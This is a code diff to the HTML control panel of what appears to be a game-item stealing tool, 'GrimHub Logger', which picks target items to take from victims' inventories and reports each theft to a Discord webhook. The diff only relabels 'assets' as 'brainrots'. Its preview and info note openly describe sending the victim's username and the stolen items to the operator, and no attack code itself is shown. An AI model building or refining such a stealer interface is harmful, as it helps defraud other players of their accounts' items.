@@ -518,7 +518,7 @@
             <div class="stat-icon">🧠</div>
             <div class="stat-info">
                 <h3 id="totalBrainrotsCount">0</h3>
-                <p>Total Assets</p>
+                <p>Total Brainrots</p>
             </div>
         </div>
         <div class="stat-card">
@@ -576,10 +576,10 @@
 
         <div class="card">
             <div class="card-title">
-                <span>🧠</span> Target Assets
+                <span>🧠</span> Target Brainrots
             </div>
             <div class="search-box">
-                <input type="text" id="brainrotSearch" placeholder="Search assets...">
+                <input type="text" id="brainrotSearch" placeholder="Search brainrots...">
             </div>
             <div class="category-filters" id="categoryFilters">
                 <button class="category-btn active" data-category="all">All</button>
@@ -600,13 +600,13 @@
         </div>
     </div>
 
-    <!-- Embed Preview Card - EXPLAINING THE DIFFERENCE -->
+    <!-- Embed Preview Card -->
     <div class="card" style="margin-bottom: 1.5rem;">
         <div class="card-title">
             <span>🎨</span> Discord Webhook Preview
         </div>
         <div class="embed-preview" id="embedPreview">
-            <div class="embed-preview-title">📤 WHAT WILL BE SENT TO YOUR DISCORD WHEN ASSETS ARE STOLEN</div>
+            <div class="embed-preview-title">📤 WHAT WILL BE SENT TO YOUR DISCORD WHEN BRAINROTS ARE STOLEN</div>
             <div class="fake-embed">
                 <div class="fake-embed-header">
                     <div class="fake-embed-avatar">💀</div>
@@ -618,7 +618,7 @@
                     <div class="fake-embed-field">
                         <span>👤 Victim:</span> (Victim Username - will be filled automatically)<br>
                         <span>🎯 Stolen By:</span> <span id="previewTarget">Morreria</span><br>
-                        <span>🧠 Assets Taken:</span> <span id="previewBrainrots">None selected</span>
+                        <span>🧠 Brainrots Stolen:</span> <span id="previewBrainrots">None selected</span>
                     </div>
                     <div class="fake-embed-footer">
                         GrimHub Logger • Auto Morreria System • Just now
@@ -627,8 +627,8 @@
             </div>
         </div>
         <div class="info-note">
-            ℹ️ The script will only send this webhook when assets are actually stolen from a victim. 
-            The "Target Assets" list above is used to determine WHICH assets to look for in the victim's inventory.
+            ℹ️ The script will only send this webhook when brainrots are actually stolen from a victim. 
+            The "Target Brainrots" list above is used to determine WHICH brainrots to look for in the victim's inventory.
         </div>
     </div>
 
@@ -787,7 +787,7 @@
         updateSelectedCount();
         renderBrainrots();
         updatePreview();
-        showToast(`Selected ${selectedBrainrots.size} target assets`);
+        showToast(`Selected ${selectedBrainrots.size} target brainrots`);
     }
 
     function deselectAll() {
@@ -795,7 +795,7 @@
         updateSelectedCount();
         renderBrainrots();
         updatePreview();
-        showToast('Deselected all target assets');
+        showToast('Deselected all target brainrots');
     }
 
     selectAllBtn.addEventListener('click', selectAll);
